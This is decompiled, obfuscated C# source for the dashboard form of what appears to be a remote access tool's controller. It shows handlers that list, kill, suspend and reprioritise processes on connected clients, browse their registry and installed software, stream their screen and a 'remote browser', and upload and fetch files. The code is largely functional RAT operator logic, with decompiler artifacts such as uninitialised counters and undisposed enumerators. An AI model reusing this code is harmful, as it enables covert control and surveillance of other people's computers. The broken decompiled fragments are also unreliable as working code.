		{
			ImageSize = new Size(24, 20)
		};
		if (this.vmethod_746().InvokeRequired)
		{
			this.vmethod_746().Invoke(new fDashboard.Delegate12(this.method_23), new object[]
			{
				string_12
			});
			return;
		}
		this.vmethod_754().SendToBack();
		this.vmethod_754().Visible = false;
		this.vmethod_746().Items.Clear();
		checked
		{
			int num = string_12.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				try
				{
					Image image = Image.FromFile(Application.StartupPath + "\\data\\media\\icons\\regkey.png");
					string[] array = Strings.Split(string_12[i], ",", -1, CompareMethod.Text);
					this.imageList_3.Images.Add(array[0], image);
					fDashboard.Class127 item = new fDashboard.Class127(array[0], image);
					this.vmethod_746().Items.Add(item);
				}
				catch (Exception ex)
				{
				}
				int num2;
				num2++;
			}
			this.collection_0.Clear();
			this.vmethod_744().Enabled = true;
			this.vmethod_730().Enabled = false;
			this.vmethod_728().Enabled = false;
			if (this.vmethod_746().Items.Count > 0)
			{
				this.vmethod_746().SelectedIndex = 1;
				this.vmethod_748().Enabled = true;
				this.vmethod_750().Enabled = true;
			}
		}
	}

	// Token: 0x06000872 RID: 2162 RVA: 0x0003E688 File Offset: 0x0003C888
	public void method_24(ref string[] string_12)
	{
		ImageList imageList = new ImageList
		{
			ImageSize = new Size(16, 16)
		};
		if (this.vmethod_720().InvokeRequired)
		{
			this.vmethod_720().Invoke(new fDashboard.Delegate15(this.method_24), new object[]
			{
				string_12
			});
			return;
		}
		checked
		{
			try
			{
				this.vmethod_754().SendToBack();
				this.vmethod_754().Visible = false;
				this.vmethod_730().Enabled = false;
				this.vmethod_728().Enabled = false;
				this.vmethod_726().Enabled = false;
				this.vmethod_744().Enabled = false;
				this.vmethod_724().Enabled = false;
				this.vmethod_746().Enabled = false;
				this.vmethod_748().Enabled = false;
				this.vmethod_748().Update();
				this.vmethod_750().Update();
				this.vmethod_748().Items.Clear();
				this.vmethod_750().Items.Clear();
				this.vmethod_750().SmallImageList = imageList;
				this.vmethod_748().SmallImageList = imageList;
				this.vmethod_752().MaximumValue = 1;
				this.vmethod_752().Visible = true;
				this.vmethod_742().Maximum = 1;
				this.vmethod_752().MaximumValue = string_12.Length;
				this.string_7 = string_12[string_12.Length - 1];
				if (Strings.InStr(this.string_7, "-2147483648", CompareMethod.Text) != 0)
				{
					this.vmethod_734().Text = "Path: " + Strings.Replace(this.string_7, "-2147483648", "HKEY_CLASSES_ROOT", 1, -1, CompareMethod.Text);
				}
				if (Strings.InStr(this.string_7, "-2147483647", CompareMethod.Text) != 0)
				{
					this.vmethod_734().Text = "Path: " + Strings.Replace(this.string_7, "-2147483647", "HKEY_CURRENT_USER", 1, -1, CompareMethod.Text);
				}
				if (Strings.InStr(this.string_7, "-2147483646", CompareMethod.Text) != 0)
				{
					this.vmethod_734().Text = "Path: " + Strings.Replace(this.string_7, "-2147483646", "HKEY_LOCAL_MACHINE", 1, -1, CompareMethod.Text);
				}
				if (Strings.InStr(this.string_7, "-2147483645", CompareMethod.Text) != 0)
				{
					this.vmethod_734().Text = "Path: " + Strings.Replace(this.string_7, "-2147483645", "HKEY_USERS", 1, -1, CompareMethod.Text);
				}
				if (Strings.InStr(this.string_7, "-2147483643", CompareMethod.Text) != 0)
				{
					this.vmethod_734().Text = "Path: " + Strings.Replace(this.string_7, "-2147483643", "HKEY_CURRENT_CONFIG", 1, -1, CompareMethod.Text);
				}
				this.vmethod_752().Visible = true;
				this.vmethod_742().Maximum = this.vmethod_752().MaximumValue;
				this.vmethod_752().Value = 0;
				this.vmethod_742().Value = 0;
				List<ListViewItem> list = new List<ListViewItem>();
				List<ListViewItem> list2 = new List<ListViewItem>();
				this.vmethod_750().Items.Clear();
				Image image = Image.FromFile(Application.StartupPath + "\\data\\media\\icons\\regkey.png");
				Image image2 = Image.FromFile(Application.StartupPath + "\\data\\media\\icons\\regedit_sz.png");
				Image image3 = Image.FromFile(Application.StartupPath + "\\data\\media\\icons\\regvalue_bin.png");
				imageList.Images.Add("key", image);
				imageList.Images.Add("sz", image2);
				imageList.Images.Add("bin", image3);
				int num = string_12.Length - 2;
				for (int i = 0; i <= num; i++)
				{
					try
					{
						ListViewItem listViewItem = new ListViewItem();
						ListViewItem listViewItem2 = new ListViewItem();
						if (Strings.InStr(string_12[i], ",", CompareMethod.Text) > 0)
						{
							string[] array = Strings.Split(string_12[i], ",", -1, CompareMethod.Text);
							string text = "REG_SZ";
							string imageKey = "sz";
							string left = array[1];
							if (Operators.CompareString(left, "0", true) == 0)
							{
								text = "REG_NONE";
								imageKey = "sz";
							}
							else if (Operators.CompareString(left, "1", true) == 0)
							{
								text = "REG_SZ";
								imageKey = "sz";
							}
							else if (Operators.CompareString(left, "2", true) == 0)
							{
								text = "REG_EXPAND_SZ";
								imageKey = "sz";
							}
							else if (Operators.CompareString(left, "3", true) == 0)
							{
								text = "REG_BINARY";
								imageKey = "bin";
							}
							else if (Operators.CompareString(left, "4", true) == 0)
							{
								text = "REG_DWORD";
								imageKey = "bin";
							}
							else if (Operators.CompareString(left, "5", true) == 0)
							{
								text = "REG_DWORD_BIG_ENDIAN";
								imageKey = "bin";
							}
							else if (Operators.CompareString(left, "6", true) == 0)
							{
								text = "REG_LINK";
								imageKey = "sz";
							}
							else if (Operators.CompareString(left, "7", true) == 0)
							{
								text = "REG_MULTI_SZ";
								imageKey = "sz";
							}
							else if (Operators.CompareString(left, "8", true) == 0)
							{
								text = "REG_RESOURCE_LIST";
								imageKey = "sz";
							}
							else if (Operators.CompareString(left, "9", true) == 0)
							{
								text = "REG_FULL_RESOURCE_DESCRIPTOR";
								imageKey = "sz";
							}
							else if (Operators.CompareString(left, "10", true) == 0)
							{
								text = "REG_RESOURCE_REQUIREMENTS_LIST";
								imageKey = "sz";
							}
							else if (Operators.CompareString(left, "11", true) == 0)
							{
								text = "REG_QWORD";
								imageKey = "bin";
							}
							listViewItem.Text = Encoding.UTF8.GetString(Convert.FromBase64String(array[0]));
							listViewItem.Tag = this.string_7;
							listViewItem.ImageKey = imageKey;
							listViewItem.SubItems.Add(text);
							listViewItem.SubItems.Add(Encoding.UTF8.GetString(Convert.FromBase64String(array[2])));
							list.Add(listViewItem);
						}
						else
						{
							string[] array2 = Strings.Split(string_12[i], ":", -1, CompareMethod.Text);
							listViewItem2.Text = Encoding.UTF8.GetString(Convert.FromBase64String(array2[0]));
							listViewItem2.ImageKey = "key";
							listViewItem2.Tag = Encoding.UTF8.GetString(Convert.FromBase64String(array2[1]));
							if (Operators.CompareString(Conversions.ToString(listViewItem2.Tag.ToString().Last<char>()), "\\", true) != 0)
							{
								listViewItem2.Tag = Operators.ConcatenateObject(listViewItem2.Tag, "\\");
							}
							list2.Add(listViewItem2);
						}
						if (this.vmethod_752().Value < this.vmethod_752().MaximumValue)
						{
							ZeroitAnidasoCircleProgress zeroitAnidasoCircleProgress;
							(zeroitAnidasoCircleProgress = this.vmethod_752()).Value = zeroitAnidasoCircleProgress.Value + 1;
							this.vmethod_742().Value = this.vmethod_752().Value;
						}
						Application.DoEvents();
					}
					catch (Exception ex)
					{
					}
				}
				this.vmethod_736().Text = "Keys: " + Conversions.ToString(list2.Count);
				this.vmethod_738().Text = "Values: " + Conversions.ToString(list.Count);
				this.vmethod_750().Items.AddRange(list.ToArray());
				this.vmethod_748().Items.AddRange(list2.ToArray());
				if (this.fRegAdd_0 != null)
				{
					this.fRegAdd_0.string_1 = this.string_7;
					this.fRegAdd_0.vmethod_12().Enabled = true;
				}
			}
			catch (Exception ex2)
			{
			}
			this.vmethod_752().Value = this.vmethod_752().MaximumValue;
			this.vmethod_752().Visible = false;
			if (this.string_7.Length >= 3)
			{
				this.vmethod_724().Enabled = true;
			}
			this.vmethod_730().Enabled = Conversions.ToBoolean(Interaction.IIf(this.string_7.Length > 3, true, false));
			if (this.collection_0.Count > 0)
			{
				this.vmethod_728().Enabled = true;
			}
			this.vmethod_726().Enabled = true;
			this.vmethod_724().Enabled = true;
			this.vmethod_744().Enabled = true;
			this.vmethod_746().Enabled = true;
			this.vmethod_748().Enabled = true;
			this.vmethod_750().Enabled = true;
			this.vmethod_742().Value = 0;
		}
	}

	// Token: 0x06000873 RID: 2163 RVA: 0x0003EED4 File Offset: 0x0003D0D4
	public void method_25(ref string string_12)
	{
		string text = string.Empty;
		string text2 = string.Empty;
		string text3 = string.Empty;
		string text4 = string.Empty;
		string text5 = string.Empty;
		string text6 = string.Empty;
		string text7 = string.Empty;
		ImageList imageList = new ImageList
		{
			ImageSize = new Size(16, 16)
		};
		if (this.vmethod_550().InvokeRequired)
		{
			this.vmethod_550().Invoke(new fDashboard.Delegate26(this.method_25), new object[]
			{
				string_12
			});
			return;
		}
		List<ListViewItem> list = new List<ListViewItem>();
		this.vmethod_550().Items.Clear();
		this.vmethod_550().SmallImageList = imageList;
		this.vmethod_544().Value = 0;
		this.vmethod_544().Maximum = 1;
		this.vmethod_548().MaximumValue = 1;
		this.vmethod_548().Visible = true;
		checked
		{
			List<JToken> list2 = JObject.Parse(string_12.Substring(7, string_12.Length - 8))["block"].ToList<JToken>();
			this.vmethod_548().MaximumValue = list2.Count - 1;
			this.vmethod_548().Value = 0;
			this.vmethod_544().Maximum = this.vmethod_548().MaximumValue;
			this.vmethod_542().Text = "Installed software: " + Conversions.ToString(list2.Count);
			this.vmethod_546().SendToBack();
			this.vmethod_546().Visible = false;
			try
			{
				foreach (JToken jtoken in list2)
				{
					try
					{
						ListViewItem listViewItem = new ListViewItem();
						text = jtoken["n"].ToString();
						text2 = jtoken["path"].ToString();
						text3 = jtoken["pb"].ToString();
						text4 = jtoken["date"].ToString();
						text5 = jtoken["sz"].ToString();
						text6 = jtoken["v"].ToString();
						text7 = jtoken["silent"].ToString();
						byte[] array = Convert.FromBase64String(jtoken["icon"].ToString());
						Image image = Class136.smethod_18(ref array);
						imageList.Images.Add(text, image);
						listViewItem.Text = text;
						listViewItem.ImageKey = text;
						listViewItem.SubItems.Add(text2);
						listViewItem.SubItems.Add(text3);
						listViewItem.SubItems.Add(text4);
						listViewItem.SubItems.Add(text5);
						listViewItem.SubItems.Add(text6);
						listViewItem.Tag = text7;
						text7 = Conversions.ToString(Interaction.IIf(text7.Length > 3, "Yes", "No"));
						listViewItem.SubItems.Add(text7);
						list.Add(listViewItem);
						if (this.vmethod_548().Value < this.vmethod_548().MaximumValue)
						{
							ZeroitAnidasoCircleProgress zeroitAnidasoCircleProgress;
							(zeroitAnidasoCircleProgress = this.vmethod_548()).Value = zeroitAnidasoCircleProgress.Value + 1;
							ToolStripProgressBar toolStripProgressBar;
							(toolStripProgressBar = this.vmethod_544()).Value = toolStripProgressBar.Value + 1;
						}
					}
					catch (Exception ex)
					{
					}
					Application.DoEvents();
				}
			}
			finally
			{
				List<JToken>.Enumerator enumerator;
				((IDisposable)enumerator).Dispose();
			}
			this.vmethod_548().Value = this.vmethod_548().MaximumValue;
			this.vmethod_548().Visible = false;
			this.vmethod_550().Enabled = true;
			this.vmethod_550().Items.AddRange(list.ToArray());
			try
			{
				foreach (object obj in this.vmethod_550().Columns)
				{
					((ColumnHeader)obj).Tag = SortOrder.None;
				}
			}
			finally
			{
				IEnumerator enumerator2;
				if (enumerator2 is IDisposable)
				{
					(enumerator2 as IDisposable).Dispose();
				}
			}
			this.vmethod_544().Value = 0;
		}
	}

	// Token: 0x06000874 RID: 2164 RVA: 0x00006757 File Offset: 0x00004957
	private void method_26(object sender, EventArgs e)
	{
		this.vmethod_18().SelectedIndex = 1;
		this.method_80();
		this.method_41();
	}

	// Token: 0x06000875 RID: 2165 RVA: 0x00006771 File Offset: 0x00004971
	private void method_27(object sender, EventArgs e)
	{
		this.vmethod_18().SelectedIndex = 0;
		this.method_41();
	}

	// Token: 0x06000876 RID: 2166 RVA: 0x00006785 File Offset: 0x00004985
	private void method_28(object sender, EventArgs e)
	{
		this.vmethod_508().SendToBack();
		this.vmethod_18().SelectedIndex = 2;
		this.method_41();
	}

	// Token: 0x06000877 RID: 2167 RVA: 0x0003F2F8 File Offset: 0x0003D4F8
	private void method_29(object sender, EventArgs e)
	{
		this.vmethod_78().Enabled = false;
		this.vmethod_78().Items.Clear();
		this.vmethod_508().BringToFront();
		this.vmethod_508().Visible = true;
		string text = this.string_4;
		string text2 = "prc_list|1";
		string text3 = text;
		Class136.Class138 @class = new Class136.Class138();
		@class.string_0 = text3;
		@class.string_1 = text2;
		@class.long_0 = 0L;
		try
		{
			if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
			{
				new Thread(new ThreadStart(@class._Lambda$__0)).Start();
			}
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x06000878 RID: 2168 RVA: 0x0003F3B0 File Offset: 0x0003D5B0
	private void method_30(object sender, EventArgs e)
	{
		checked
		{
			if (this.vmethod_78().Items.Count != 0)
			{
				GClass7 gclass = this.vmethod_78();
				int num = gclass.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (gclass.Items[i].Selected)
					{
						string text = this.string_4;
						string text2 = "prc_suspend|" + gclass.Items[i].SubItems[3].Text;
						string text3 = text;
						Class136.Class138 @class = new Class136.Class138();
						@class.string_0 = text3;
						@class.string_1 = text2;
						@class.long_0 = 0L;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex)
						{
						}
					}
				}
				gclass = null;
			}
		}
	}

	// Token: 0x06000879 RID: 2169 RVA: 0x0003F4B4 File Offset: 0x0003D6B4
	private void method_31(object sender, EventArgs e)
	{
		checked
		{
			if (this.vmethod_78().Items.Count != 0)
			{
				GClass7 gclass = this.vmethod_78();
				int num = gclass.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (gclass.Items[i].Selected)
					{
						string text = this.string_4;
						string text2 = "prc_kill|" + gclass.Items[i].SubItems[3].Text;
						string text3 = text;
						Class136.Class138 @class = new Class136.Class138();
						@class.string_0 = text3;
						@class.string_1 = text2;
						@class.long_0 = 0L;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex)
						{
						}
					}
				}
				gclass = null;
			}
		}
	}

	// Token: 0x0600087A RID: 2170 RVA: 0x0003F5B8 File Offset: 0x0003D7B8
	private void method_32(object sender, EventArgs e)
	{
		checked
		{
			if (this.vmethod_78().Items.Count != 0)
			{
				GClass7 gclass = this.vmethod_78();
				int num = gclass.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (gclass.Items[i].Selected)
					{
						string text = this.string_4;
						string text2 = "prc_resume|" + gclass.Items[i].SubItems[3].Text;
						string text3 = text;
						Class136.Class138 @class = new Class136.Class138();
						@class.string_0 = text3;
						@class.string_1 = text2;
						@class.long_0 = 0L;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex)
						{
						}
					}
				}
				gclass = null;
			}
		}
	}

	// Token: 0x0600087B RID: 2171 RVA: 0x0003F6BC File Offset: 0x0003D8BC
	private void method_33(object sender, EventArgs e)
	{
		checked
		{
			if (this.vmethod_78().Items.Count != 0)
			{
				GClass7 gclass = this.vmethod_78();
				int num = gclass.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (gclass.Items[i].Selected)
					{
						string text = this.string_4;
						string text2 = "prc_priority|" + gclass.Items[i].SubItems[3].Text + "|1";
						string text3 = text;
						Class136.Class138 @class = new Class136.Class138();
						@class.string_0 = text3;
						@class.string_1 = text2;
						@class.long_0 = 0L;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex)
						{
						}
					}
				}
				gclass = null;
			}
		}
	}

	// Token: 0x0600087C RID: 2172 RVA: 0x0003F7C4 File Offset: 0x0003D9C4
	private void method_34(object sender, EventArgs e)
	{
		checked
		{
			if (this.vmethod_78().Items.Count != 0)
			{
				GClass7 gclass = this.vmethod_78();
				int num = gclass.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (gclass.Items[i].Selected)
					{
						string text = this.string_4;
						string text2 = "prc_priority|" + gclass.Items[i].SubItems[3].Text + "|2";
						string text3 = text;
						Class136.Class138 @class = new Class136.Class138();
						@class.string_0 = text3;
						@class.string_1 = text2;
						@class.long_0 = 0L;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex)
						{
						}
					}
				}
				gclass = null;
			}
		}
	}

	// Token: 0x0600087D RID: 2173 RVA: 0x0003F8CC File Offset: 0x0003DACC
	private void method_35(object sender, EventArgs e)
	{
		checked
		{
			if (this.vmethod_78().Items.Count != 0)
			{
				GClass7 gclass = this.vmethod_78();
				int num = gclass.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (gclass.Items[i].Selected)
					{
						string text = this.string_4;
						string text2 = "prc_priority|" + gclass.Items[i].SubItems[3].Text + "|3";
						string text3 = text;
						Class136.Class138 @class = new Class136.Class138();
						@class.string_0 = text3;
						@class.string_1 = text2;
						@class.long_0 = 0L;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex)
						{
						}
					}
				}
				gclass = null;
			}
		}
	}

	// Token: 0x0600087E RID: 2174 RVA: 0x0003F9D4 File Offset: 0x0003DBD4
	private void method_36(object sender, EventArgs e)
	{
		checked
		{
			if (this.vmethod_78().Items.Count != 0)
			{
				GClass7 gclass = this.vmethod_78();
				int num = gclass.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (gclass.Items[i].Selected)
					{
						string text = this.string_4;
						string text2 = "prc_priority|" + gclass.Items[i].SubItems[3].Text + "|4";
						string text3 = text;
						Class136.Class138 @class = new Class136.Class138();
						@class.string_0 = text3;
						@class.string_1 = text2;
						@class.long_0 = 0L;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex)
						{
						}
					}
				}
				gclass = null;
			}
		}
	}

	// Token: 0x0600087F RID: 2175 RVA: 0x0003FADC File Offset: 0x0003DCDC
	private void method_37(object sender, EventArgs e)
	{
		checked
		{
			if (this.vmethod_78().Items.Count != 0)
			{
				GClass7 gclass = this.vmethod_78();
				int num = gclass.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (gclass.Items[i].Selected)
					{
						string text = this.string_4;
						string text2 = "prc_priority|" + gclass.Items[i].SubItems[3].Text + "|5";
						string text3 = text;
						Class136.Class138 @class = new Class136.Class138();
						@class.string_0 = text3;
						@class.string_1 = text2;
						@class.long_0 = 0L;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex)
						{
						}
					}
				}
				gclass = null;
			}
		}
	}

	// Token: 0x06000880 RID: 2176 RVA: 0x0003FBE4 File Offset: 0x0003DDE4
	private void method_38(object sender, EventArgs e)
	{
		checked
		{
			if (this.vmethod_78().Items.Count != 0)
			{
				GClass7 gclass = this.vmethod_78();
				int num = gclass.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (gclass.Items[i].Selected)
					{
						string text = this.string_4;
						string text2 = "prc_priority|" + gclass.Items[i].SubItems[3].Text + "|6";
						string text3 = text;
						Class136.Class138 @class = new Class136.Class138();
						@class.string_0 = text3;
						@class.string_1 = text2;
						@class.long_0 = 0L;
						try
						{
							if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
							{
								new Thread(new ThreadStart(@class._Lambda$__0)).Start();
							}
						}
						catch (Exception ex)
						{
						}
					}
				}
				gclass = null;
			}
		}
	}

	// Token: 0x06000881 RID: 2177 RVA: 0x000067A4 File Offset: 0x000049A4
	private void method_39(object sender, EventArgs e)
	{
		this.vmethod_18().SelectedIndex = 3;
		this.method_41();
		if (this.vmethod_454().Items.Count == 0)
		{
			this.method_228();
		}
	}

	// Token: 0x06000882 RID: 2178 RVA: 0x0003FCEC File Offset: 0x0003DEEC
	private void method_40()
	{
		int selectedIndex = this.vmethod_18().SelectedIndex;
		string text2;
		string text3;
		Class136.Class138 @class;
		if (selectedIndex == 1)
		{
			string text = this.string_4;
			text2 = "screenlive_dim|" + Conversions.ToString(this.vmethod_24().Width) + "|" + Conversions.ToString(this.vmethod_24().Height);
			text3 = text;
			@class = new Class136.Class138();
			@class.string_0 = text3;
			@class.string_1 = text2;
			@class.long_0 = 0L;
			try
			{
				if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
				{
					new Thread(new ThreadStart(@class._Lambda$__0)).Start();
				}
			}
			catch (Exception ex)
			{
			}
			return;
		}
		if (selectedIndex != 11)
		{
			return;
		}
		string text4 = this.string_4;
		text2 = "remotebrowser_dim|" + Conversions.ToString(this.vmethod_464().Width) + "|" + Conversions.ToString(this.vmethod_464().Height);
		text3 = text4;
		@class = new Class136.Class138();
		@class.string_0 = text3;
		@class.string_1 = text2;
		@class.long_0 = 0L;
		try
		{
			if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
			{
				new Thread(new ThreadStart(@class._Lambda$__0)).Start();
			}
		}
		catch (Exception ex2)
		{
		}
	}

	// Token: 0x06000883 RID: 2179 RVA: 0x0003FE60 File Offset: 0x0003E060
	private void method_41()
	{
		checked
		{
			this.vmethod_554().Left = (int)Math.Round(unchecked((double)this.vmethod_552().Left + (double)this.vmethod_552().Width / 2.0 - (double)this.vmethod_554().Width / 2.0));
			this.vmethod_554().Top = (int)Math.Round(unchecked((double)this.vmethod_552().Top + (double)this.vmethod_552().Height / 2.0 - (double)this.vmethod_554().Height / 2.0));
			this.vmethod_120().Left = (int)Math.Round(unchecked((double)this.vmethod_78().Left + (double)this.vmethod_78().Width / 2.0 - (double)this.vmethod_120().Width / 2.0));
			this.vmethod_120().Top = (int)Math.Round(unchecked((double)this.vmethod_78().Top + (double)this.vmethod_78().Height / 2.0 - (double)this.vmethod_120().Height / 2.0));
			this.vmethod_508().Left = this.vmethod_120().Left;
			this.vmethod_508().Top = this.vmethod_120().Top;
			this.vmethod_472().Left = (int)Math.Round(unchecked((double)this.vmethod_720().Left + (double)this.vmethod_720().Width / 2.0 - (double)this.vmethod_472().Width / 2.0));
			this.vmethod_472().Top = (int)Math.Round(unchecked((double)this.vmethod_720().Top + (double)this.vmethod_720().Height / 2.0 - (double)this.vmethod_472().Height / 2.0));
			this.vmethod_474().Left = this.vmethod_472().Left;
			this.vmethod_474().Top = this.vmethod_472().Top;
			this.vmethod_290().Left = (int)Math.Round(unchecked((double)this.vmethod_280().Left + (double)this.vmethod_280().Width / 2.0 - (double)this.vmethod_290().Width / 2.0));
			this.vmethod_290().Top = (int)Math.Round(unchecked((double)this.vmethod_280().Top + (double)this.vmethod_280().Height / 2.0 - (double)this.vmethod_290().Height / 2.0));
			this.vmethod_556().Left = this.vmethod_290().Left;
			this.vmethod_556().Top = this.vmethod_290().Top;
			this.vmethod_364().Left = (int)Math.Round(unchecked((double)this.vmethod_718().Left + (double)this.vmethod_718().Width / 2.0 - (double)this.vmethod_364().Width / 2.0));
			this.vmethod_364().Top = (int)Math.Round(unchecked((double)this.vmethod_718().Top + (double)this.vmethod_718().Height / 2.0 - (double)this.vmethod_364().Height / 2.0));
			this.vmethod_512().Left = this.vmethod_364().Left;
			this.vmethod_512().Top = this.vmethod_364().Top;
			this.vmethod_548().Left = (int)Math.Round(unchecked((double)this.vmethod_550().Left + (double)this.vmethod_550().Width / 2.0 - (double)this.vmethod_548().Width / 2.0));
			this.vmethod_548().Top = (int)Math.Round(unchecked((double)this.vmethod_550().Top + (double)this.vmethod_550().Height / 2.0 - (double)this.vmethod_548().Height / 2.0));
			this.vmethod_546().Left = this.vmethod_548().Left;
			this.vmethod_546().Top = this.vmethod_548().Top;
			this.vmethod_576().Left = (int)Math.Round(unchecked((double)this.vmethod_578().Left + (double)this.vmethod_578().Width / 2.0 - (double)this.vmethod_576().Width / 2.0));
			this.vmethod_576().Top = (int)Math.Round(unchecked((double)this.vmethod_578().Top + (double)this.vmethod_578().Height / 2.0 - (double)this.vmethod_576().Height / 2.0));
			this.vmethod_566().Left = this.vmethod_576().Left;
			this.vmethod_566().Top = this.vmethod_576().Top;
			this.vmethod_622().Left = (int)Math.Round(unchecked((double)this.vmethod_624().Left + (double)this.vmethod_624().Width / 2.0 - (double)this.vmethod_622().Width / 2.0));
			this.vmethod_622().Top = (int)Math.Round(unchecked((double)this.vmethod_624().Top + (double)this.vmethod_624().Height / 2.0 - (double)this.vmethod_622().Height / 2.0));
			this.vmethod_614().Left = this.vmethod_622().Left;
			this.vmethod_614().Top = this.vmethod_622().Top;
		}
	}

	// Token: 0x06000884 RID: 2180 RVA: 0x00040454 File Offset: 0x0003E654
	private void fDashboard_Resize(object sender, EventArgs e)
	{
		checked
		{
			try
			{
				this.vmethod_18().Width = base.Width - 2;
				this.vmethod_18().Height = base.Height - this.vmethod_18().Top - 30;
				this.vmethod_552().Columns[this.vmethod_552().Columns["oVAL2"].Index].Width = this.vmethod_552().Width - this.vmethod_552().Columns[this.vmethod_552().Columns["oVAL1"].Index].Width - 6;
				this.method_80();
				this.method_41();
				this.method_40();
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x06000885 RID: 2181 RVA: 0x000067D0 File Offset: 0x000049D0
	private void fDashboard_FormClosing(object sender, FormClosingEventArgs e)
	{
		this.method_148();
		e.Cancel = true;
	}

	// Token: 0x06000886 RID: 2182 RVA: 0x00040534 File Offset: 0x0003E734
	private void method_42(object sender, EventArgs e)
	{
		if (this.string_8.Length >= 3)
		{
			this.vmethod_446().Enabled = false;
			this.vmethod_448().Enabled = false;
			this.vmethod_450().Enabled = false;
			this.vmethod_696().Enabled = false;
			this.vmethod_452().Enabled = false;
			this.vmethod_454().Enabled = false;
			this.vmethod_76().Enabled = false;
			this.vmethod_720().Items.Clear();
			this.vmethod_474().BringToFront();
			this.vmethod_474().Visible = true;
			string text = this.string_4;
			string text2 = Conversions.ToString(Operators.ConcatenateObject("files_get|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(this.string_8)) + "|", Interaction.IIf(this.vmethod_812().Checked, "1", "0")));
			string text3 = text;
			Class136.Class138 @class = new Class136.Class138();
			@class.string_0 = text3;
			@class.string_1 = text2;
			@class.long_0 = 0L;
			try
			{
				if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
				{
					new Thread(new ThreadStart(@class._Lambda$__0)).Start();
				}
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x06000887 RID: 2183 RVA: 0x00040688 File Offset: 0x0003E888
	private void method_43(object sender, EventArgs e)
	{
		OpenFileDialog openFileDialog = new OpenFileDialog();
		string text = string.Empty;
		if (Operators.CompareString(text, string.Empty, true) == 0)
		{
			Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
		}
		OpenFileDialog openFileDialog2 = openFileDialog;
		openFileDialog2.Title = "Select file(s) for upload";
		openFileDialog2.InitialDirectory = text;
		openFileDialog2.Multiselect = true;
		checked
		{
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				string[] fileNames = openFileDialog.FileNames;
				long num;
				for (int i = 0; i < fileNames.Length; i++)
				{
					num += 1L;
				}
				if (MessageBox.Show("Upload " + Conversions.ToString(num) + " file(s)?", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) == DialogResult.Yes)
				{
					text = Path.GetDirectoryName(openFileDialog.FileName);
					Class130.fTransferManager_0.Visible = true;
					Form fTransferManager_ = Class130.fTransferManager_0;
					bool flag = false;
					Form form = fTransferManager_;
					Rectangle rectangle;
					if (this != null)
					{
						rectangle = this.RectangleToScreen(this.ClientRectangle);
					}
					else
					{
						rectangle = Screen.FromPoint(form.Location).WorkingArea;
					}
					int x = rectangle.Left + (rectangle.Width - form.Width) / 2;
					int y = rectangle.Top + (rectangle.Height - form.Height) / 2;
					form.Location = new Point(x, y);
					if (flag)
					{
						form.Visible = true;
					}
					Class130.fTransferManager_0.Opacity = 100.0;
					Class130.fTransferManager_0.Activate();
					string text3;
					string key;
					foreach (string s in openFileDialog.FileNames)
					{
						string text2 = Strings.Replace(this.vmethod_398().Text, "Path: ", string.Empty, 1, -1, CompareMethod.Text);
						if (Operators.CompareString(Strings.Mid(text2, text2.Length, 1), "\\", true) != 0)
						{
							text2 += "\\";
						}
						text3 = Convert.ToBase64String(Encoding.UTF8.GetBytes(s));
						key = Convert.ToBase64String(Encoding.UTF8.GetBytes(text2));
						this.method_49(ref text3, ref key);
						Thread.Sleep(1);
						Application.DoEvents();
					}
					ConcurrentDictionary<string, CClient> concurrentDictionary_ = Class130.concurrentDictionary_3;
					CClient value = concurrentDictionary_[key = this.string_4];
					text3 = Conversions.ToString(Operators.ConcatenateObject("files_get|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(this.string_8)) + "|", Interaction.IIf(this.vmethod_812().Checked, "1", "0")));
					long num2 = 0L;
					ref string ptr = ref text3;
					ref CClient ptr2 = ref value;
					ConcurrentDictionary<string, CClient> concurrentDictionary = concurrentDictionary_;
					try
					{
						if (num2 > 0L)
						{
							Thread.Sleep((int)(num2 * 60000L));
						}
						ptr += "@";
						byte[] bytes = Encoding.UTF8.GetBytes(ptr);
						ptr2.sock_async.method_6(bytes);
						CClient cclient = ptr2;
